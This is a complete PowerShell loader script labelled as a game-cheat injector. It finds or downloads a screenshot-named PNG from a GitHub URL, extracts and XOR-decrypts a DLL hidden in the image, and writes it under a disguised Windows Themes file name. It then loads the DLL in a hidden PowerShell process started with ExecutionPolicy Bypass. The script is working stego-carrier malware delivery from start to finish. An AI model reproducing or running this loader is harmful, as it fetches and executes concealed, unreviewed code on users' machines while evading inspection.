<#
    inject.ps1 - soy.Lou carrier loader
    ------------------------------------------------------------------
    Loads the cheat DLL out of the carrier PNG.

    Why this exists: the old one-liner read the carrier from a single
    hardcoded path (%USERPROFILE%\Pictures\Screenshots\...) and used a
    hardcoded payload offset + XOR key. Download the PNG anywhere else,
    or repack it with a fresh key, and PowerShell threw before printing
    anything - with -w h there was no window left to show the error, so
    the console just vanished.

    This loader is self-describing instead:
      * finds the carrier (arg, cwd, Desktop, Downloads, Pictures, TEMP)
      * locates the payload from the file itself (footer / image EOI /
        legacy offset), never from a constant baked into the command
      * recovers the XOR key from the PE header, so a repack never
        invalidates the command
      * validates the extracted image is really an x64 PE
      * reports every stage, and never hides the failure

    Usage
      inject.ps1                     find the carrier, load it
      inject.ps1 -Png <path>         use an explicit carrier
      inject.ps1 -Fetch              download the carrier if missing
      inject.ps1 -Inline             load in this console (debugging)
      inject.ps1 -ExtractOnly        write the DLL, do not load it
#>
[CmdletBinding()]
param(
    [Parameter(Position = 0)][string]$Png = '',
    [switch]$Inline,
    [switch]$ExtractOnly,
    [switch]$Fetch,
    [switch]$Diag,
    [switch]$Worker,
    [string]$Dll = '',
    [string]$Status = '',
    [string]$PngArg = ''
)

$ErrorActionPreference = 'Stop'
$ProgressPreference    = 'SilentlyContinue'

$ReleasePng = 'https://raw.githubusercontent.com/aursoy/aursoy-releases/main/Screenshot_2026-10-07_091842.png'

# Canonical first 16 bytes of an MSVC-linked PE image. The payload is XOR'd
# with a 16-byte repeating key, so these 16 known plaintext bytes recover the
# entire key. That is what makes a repack invisible to this loader.
$PeHead = [byte[]](0x4D,0x5A,0x90,0x00,0x03,0x00,0x00,0x00,
                   0x04,0x00,0x00,0x00,0xFF,0xFF,0x00,0x00)

$FooterMagic = [byte[]](0x53,0x4C,0x43,0x31)   # 'SLC1'
$FooterSize  = 28                              # magic + offset + length + key

# ---------------------------------------------------------------- output
function Line($t, $c = 'Gray') {
    if (-not $c) { $c = 'Gray' }
    Write-Host $t -ForegroundColor $c
}
function Step($t) { Line -t ("  [>] " + $t) -c 'DarkGray' }
function Ok($t)   { Line -t ("  [+] " + $t) -c 'Green' }
function Warn($t) { Line -t ("  [!] " + $t) -c 'Yellow' }
function Bad($t)  { Line -t ("  [x] " + $t) -c 'Red' }

# ---------------------------------------------------------------- PE helpers
function Test-PeImage([byte[]]$b, [long]$at) {
    if ($b.Length -lt ($at + 0x40)) { return $false }
    if ($b[$at] -ne 0x4D -or $b[$at + 1] -ne 0x5A) { return $false }
    $lfanew = [BitConverter]::ToInt32($b, [int]($at + 0x3C))
    if ($lfanew -le 0 -or $lfanew -gt 0x2000) { return $false }
    $sig = $at + $lfanew
    if (($sig + 6) -gt $b.Length) { return $false }
    return ($b[$sig] -eq 0x50 -and $b[$sig + 1] -eq 0x45 -and
            $b[$sig + 2] -eq 0x00 -and $b[$sig + 3] -eq 0x00)
}

function Get-PeMachine([byte[]]$b, [long]$at) {
    $lfanew = [BitConverter]::ToInt32($b, [int]($at + 0x3C))
    return [BitConverter]::ToUInt16($b, [int]($at + $lfanew + 4))
}

function Invoke-Xor([byte[]]$src, [int]$off, [int]$len, [byte[]]$key) {
    $out = [byte[]]::new($len)
    [Array]::Copy($src, $off, $out, 0, $len)

    # 64-bit wide loop: the key repeats every 16 bytes, so it alternates
    # between two 64-bit words. ~8x fewer managed iterations than per-byte.
    # Integer shift, not [int]($len/8): [int] rounds to nearest, which can
    # round up and make $words*8 overrun the buffer by a few bytes.
    $words = $len -shr 3
    if ($words -gt 0) {
        $k0 = [BitConverter]::ToUInt64($key, 0)
        $k1 = [BitConverter]::ToUInt64($key, 8)
        $q  = [UInt64[]]::new($words)
        [Buffer]::BlockCopy($out, 0, $q, 0, $words * 8)
        for ($i = 0; $i -lt $words; $i++) {
            if (($i -band 1) -eq 0) { $q[$i] = $q[$i] -bxor $k0 }
            else                    { $q[$i] = $q[$i] -bxor $k1 }
        }
        [Buffer]::BlockCopy($q, 0, $out, 0, $words * 8)
    }
    for ($i = $words * 8; $i -lt $len; $i++) {
        $out[$i] = $out[$i] -bxor $key[$i % 16]
    }
    return $out
}

# ---------------------------------------------------------------- layout
# Returns @{ Offset; Length; Mode } describing where the encrypted DLL lives
# inside the carrier, or $null when this file is not a carrier.
function Get-PayloadLayout([byte[]]$b) {
    $len = $b.Length
    if ($len -lt 1024) { return $null }

    # 1. Self-describing footer written by the current pack.ps1.
    if ($len -ge ($FooterSize + 64)) {
        $f = $len - $FooterSize
        if ($b[$f] -eq $FooterMagic[0] -and $b[$f + 1] -eq $FooterMagic[1] -and
            $b[$f + 2] -eq $FooterMagic[2] -and $b[$f + 3] -eq $FooterMagic[3]) {
            $off  = [long][BitConverter]::ToUInt32($b, $f + 4)
            $plen = [long][BitConverter]::ToUInt32($b, $f + 8)
            if ($off -gt 0 -and $plen -gt 1024 -and ($off + $plen) -le $len) {
                return @{ Offset = [int]$off; Length = [int]$plen; Mode = 'footer' }
            }
        }
    }

    # 2. Cover image + 4-byte length + payload. The cover's own end-of-image
    #    marker gives the exact split, so no offset constant is needed. Scan
    #    forward and validate: the real cut is the one where the length field
    #    lands exactly on the end of the file. (Searching backwards would hit
    #    the random encrypted bytes first - 0xFF 0xD9 occurs ~67 times in any
    #    4 MB of noise.)
    $s = [Text.Encoding]::GetEncoding(28591).GetString($b)
    $jpgEoi = -join ([char]0xFF, [char]0xD9)
    $pngEoi = -join ([char]0x49, [char]0x45, [char]0x4E, [char]0x44,
                     [char]0xAE, [char]0x42, [char]0x60, [char]0x82)

    foreach ($m in @(@{ P = $jpgEoi; T = 2 }, @{ P = $pngEoi; T = 8 })) {
        $idx = -1
        $seen = 0
        while ($seen -lt 8192) {
            $idx = $s.IndexOf($m.P, $idx + 1, [StringComparison]::Ordinal)
            if ($idx -lt 0) { break }
            $seen++
            $cut = [int]($idx + $m.T)
            if (($cut + 4) -ge $len) { break }
            $plen = [long][BitConverter]::ToUInt32($b, $cut)
            if ($plen -gt 1024 -and (($cut + 4 + $plen) -eq $len)) {
                return @{ Offset = $cut + 4; Length = [int]$plen; Mode = 'eoi' }
            }
        }
    }

    # 3. Legacy carriers: length field at the documented offset.
    foreach ($c in @(51756)) {
        if (($c + 4) -ge $len) { continue }
        $plen = [long][BitConverter]::ToUInt32($b, $c)
        if ($plen -gt 1024 -and (($c + 4 + $plen) -eq $len)) {
            return @{ Offset = $c + 4; Length = [int]$plen; Mode = 'legacy' }
        }
    }
    return $null
}

# ---------------------------------------------------------------- carrier hunt
function Find-Carrier {
    if ($Png -and (Test-Path -LiteralPath $Png)) { return (Resolve-Path -LiteralPath $Png).Path }

    $here = $PSScriptRoot
    if (-not $here) { $here = (Get-Location).Path }

    $dirs = @(
        $here,
        (Get-Location).Path,
        (Join-Path $env:USERPROFILE 'Desktop'),
        (Join-Path $env:USERPROFILE 'Downloads'),
        (Join-Path $env:USERPROFILE 'Pictures\Screenshots'),
        (Join-Path $env:USERPROFILE 'Pictures'),
        $env:TEMP
    )

    $seen = @{}
    foreach ($d in $dirs) {
        if (-not $d -or -not (Test-Path -LiteralPath $d)) { continue }
        if ($seen.ContainsKey($d)) { continue }
        $seen[$d] = $true

        $files = @()
        foreach ($pat in @('*.png', '*.jpg', '*.jpeg')) {
            $files += @(Get-ChildItem -LiteralPath $d -Filter $pat -File -ErrorAction SilentlyContinue)
        }
        foreach ($f in ($files | Sort-Object LastWriteTime -Descending)) {
            if ($f.Length -lt 65536) { continue }
            Step ("probing " + $f.FullName)
            try {
                $b = [IO.File]::ReadAllBytes($f.FullName)
                if (Get-PayloadLayout $b) { return $f.FullName }
            } catch { }
        }
    }

    if ($Fetch) {
        $dest = Join-Path $env:TEMP 'sl_carrier.png'
        Step ("downloading carrier -> " + $dest)
        try {
            Invoke-WebRequest -Uri $ReleasePng -OutFile $dest -UseBasicParsing
            return $dest
        } catch {
            Bad ("download failed: " + $_.Exception.Message)
            return ''
        }
    }
    return ''
}

# ---------------------------------------------------------------- worker mode
# Runs detached so the loader console can close. It splits loading into three
# visible steps (open / resolve / call) so the parent can report which one
# failed: "LoadLibraryA failed" and "no Start export" are very different bugs
# and used to look identical.
$LoaderSrc = @'
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("kernel32", SetLastError = true, CharSet = CharSet.Ansi)]
    public static extern IntPtr LoadLibraryA(string path);
    [DllImport("kernel32", CharSet = CharSet.Ansi)]
    public static extern IntPtr GetProcAddress(IntPtr mod, string name);
    [DllImport("kernel32")]
    public static extern uint GetLastError();
    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
    public delegate void F(IntPtr a, IntPtr b, string c, int d);
    public static IntPtr Open(string path) { return LoadLibraryA(path); }
    public static IntPtr Resolve(IntPtr h) { return GetProcAddress(h, "Start"); }
    public static uint LastErr() { return GetLastError(); }
    public static void Call(IntPtr s, string arg) {
        ((F)Marshal.GetDelegateForFunctionPointer(s, typeof(F)))(IntPtr.Zero, IntPtr.Zero, arg, 0);
    }
}
'@

if ($Worker) {
    try {
        if (-not $Dll -or -not (Test-Path -LiteralPath $Dll)) { throw 'worker: dll missing' }
        Set-Content -LiteralPath $Status -Value 'LOADING' -Encoding ASCII

        Add-Type -TypeDefinition $LoaderSrc -Language CSharp

        $h = [K]::Open($Dll)
        if ($h -eq [IntPtr]::Zero) {
            Set-Content -LiteralPath $Status -Value ("FAIL:LoadLibraryA=" + [K]::LastErr()) -Encoding ASCII
            exit 1
        }
        $s = [K]::Resolve($h)
        if ($s -eq [IntPtr]::Zero) {
            Set-Content -LiteralPath $Status -Value 'FAIL:no Start export' -Encoding ASCII
            exit 1
        }

        # Both checks passed, so report success before calling Start - Start
        # blocks forever on purpose, so there is no later point to report from.
        Set-Content -LiteralPath $Status -Value 'OK' -Encoding ASCII
        [K]::Call($s, ('@@' + $PngArg))
        while ($true) { Start-Sleep -Seconds 3600 }
    } catch {
        try { Set-Content -LiteralPath $Status -Value ("FAIL:EX:" + $_.Exception.Message) -Encoding ASCII } catch { }
        exit 1
    }
}

# ---------------------------------------------------------------- banner
Line -t '' -c 'Magenta'
Line -t '  soy.Lou loader' -c 'Magenta'
Line -t '  ---------------------------------------------' -c 'DarkGray'

# ---------------------------------------------------------------- locate
Step 'locating carrier'
$carrier = Find-Carrier
if (-not $carrier) {
    Bad 'no carrier PNG found.'
    Warn 'put the PNG next to this script, or in Downloads / Desktop, or pass -Png <path>.'
    Warn 'or run with -Fetch to download it.'
    Read-Host 'press enter to close'
    exit 1
}
Ok ('carrier: ' + $carrier)

$bytes = [IO.File]::ReadAllBytes($carrier)
Ok ('size: ' + $bytes.Length + ' bytes')

$layout = Get-PayloadLayout $bytes
if (-not $layout) {
    Bad 'that file is not a carrier (no payload length field found).'
    Warn 're-download it - a partial or renamed download will not have the payload.'
    Read-Host 'press enter to close'
    exit 1
}
Ok ('payload at ' + $layout.Offset + ', ' + $layout.Length + ' bytes (' + $layout.Mode + ')')

# ---------------------------------------------------------------- decrypt
Step 'deriving key from PE header'
$key = New-Object byte[] 16
for ($i = 0; $i -lt 16; $i++) { $key[$i] = $bytes[$layout.Offset + $i] -bxor $PeHead[$i] }
Ok ('key: ' + (($key | ForEach-Object { $_.ToString('X2') }) -join ' '))

Step 'decrypting'
$image = Invoke-Xor $bytes $layout.Offset $layout.Length $key

if (-not (Test-PeImage $image 0)) {
    Bad 'decrypted payload is not a valid PE image.'
    Warn 'the carrier is corrupt or was truncated mid-download.'
    Read-Host 'press enter to close'
    exit 1
}
$machine = Get-PeMachine $image 0
if ($machine -ne 0x8664) {
    Bad ('payload is not x64 (machine 0x' + $machine.ToString('X4') + ').')
    Read-Host 'press enter to close'
    exit 1
}
Ok ('valid x64 image, ' + $image.Length + ' bytes')

# ---------------------------------------------------------------- write
Step 'writing dll'
$targets = @(
    (Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\Themes\wintheme.dll'),
    (Join-Path $env:TEMP ('sl_' + [Guid]::NewGuid().ToString('N').Substring(0, 8) + '.dll')),
    (Join-Path $env:APPDATA ('sl_' + [Guid]::NewGuid().ToString('N').Substring(0, 8) + '.dll')),
    (Join-Path $env:ProgramData ('sl_' + [Guid]::NewGuid().ToString('N').Substring(0, 8) + '.dll'))
)

$dllPath = ''
foreach ($t in $targets) {
    try {
        $dir = Split-Path -Parent $t
        if ($dir -and -not (Test-Path -LiteralPath $dir)) { [void](New-Item -ItemType Directory -Path $dir -Force) }
        [IO.File]::WriteAllBytes($t, $image)
        if ((Get-Item -LiteralPath $t).Length -eq $image.Length) { $dllPath = $t; break }
    } catch {
        Warn ('write failed: ' + $t + ' -> ' + $_.Exception.Message)
    }
}

if (-not $dllPath) {
    Bad 'could not write the dll anywhere writable.'
    Read-Host 'press enter to close'
    exit 1
}
Ok ('dll: ' + $dllPath)

if ($ExtractOnly) {
    Ok 'extract only - not loading.'
    exit 0
}

# ---------------------------------------------------------------- load
if ($Diag) { $env:SL_DEBUG = '1' }
$logPath = Join-Path $env:TEMP 'sl_dbg.log'
if (-not $Diag) { Remove-Item -LiteralPath $logPath -ErrorAction SilentlyContinue }

if ($Inline) {
    Step 'loading in this console'
    Add-Type -TypeDefinition $LoaderSrc -Language CSharp

    $h = [K]::Open($dllPath)
    if ($h -eq [IntPtr]::Zero) {
        Bad ('LoadLibraryA failed with Win32 error ' + [K]::LastErr() + '.')
        Warn '126/127 = missing dependency, 193 = corrupt image, 5 = access denied.'
        Read-Host 'press enter to close'
        exit 1
    }
    $s = [K]::Resolve($h)
    if ($s -eq [IntPtr]::Zero) {
        Bad 'the DLL loaded but has no Start export - wrong dll.'
        Read-Host 'press enter to close'
        exit 1
    }

    Ok 'calling Start - leave this window open'
    [K]::Call($s, ('@@' + $carrier))

    # Start() blocks forever on success, so reaching here means it returned.
    Warn 'Start() returned - the cheat did not stay resident.'
    if ($Diag) { Warn ('dll debug log: ' + $logPath) }
    Read-Host 'press enter to close'
    exit 1
}

Step 'spawning loader process'
$statusFile = Join-Path $env:TEMP ('sl_status_' + [Guid]::NewGuid().ToString('N').Substring(0, 8) + '.txt')
$psExe = (Get-Process -Id $PID).Path
if (-not $psExe) { $psExe = 'powershell.exe' }

$workerArgs = @(
    '-NoProfile', '-ExecutionPolicy', 'Bypass',
    '-File', ('"' + $PSCommandPath + '"'),
    '-Worker',
    '-Dll', ('"' + $dllPath + '"'),
    '-PngArg', ('"' + $carrier + '"'),
    '-Status', ('"' + $statusFile + '"')
)
if ($Diag) { $workerArgs += '-Diag' }

try {
    $p = Start-Process -FilePath $psExe -ArgumentList $workerArgs -WindowStyle Hidden -PassThru
} catch {
    Bad ('could not start the loader: ' + $_.Exception.Message)
    Warn 'run this script with -Inline to load in this window instead.'
    Read-Host 'press enter to close'
    exit 1
}

$deadline = (Get-Date).AddSeconds(25)
$state = ''
while ((Get-Date) -lt $deadline) {
    Start-Sleep -Milliseconds 250
    if (Test-Path -LiteralPath $statusFile) {
        $state = (Get-Content -LiteralPath $statusFile -Raw -ErrorAction SilentlyContinue)
        if ($state) { $state = $state.Trim() }
        if ($state -eq 'OK' -or $state -like 'FAIL*') { break }
    }
    if ($p.HasExited -and -not $state) { break }
}

Remove-Item -LiteralPath $statusFile -ErrorAction SilentlyContinue

if ($state -eq 'OK') {
    Ok 'loaded. INSERT toggles the menu.'
    if ($Diag) { Warn ('dll debug log: ' + $logPath) }
} elseif ($state -like 'FAIL*') {
    Bad ('load failed: ' + $state.Substring(5))
    Warn 'the DLL loaded but Start could not be called.'
    Warn 'run with -Inline for the full error, or send %TEMP%\sl_dbg.log.'
    Read-Host 'press enter to close'
    exit 1
} else {
    Warn 'loader process is running but did not report back in time.'
    Warn 'the menu may still open - press INSERT. If it does not, run with -Inline.'
    Warn ('dll debug log: ' + $logPath)
    Read-Host 'press enter to close'
    exit 1
}
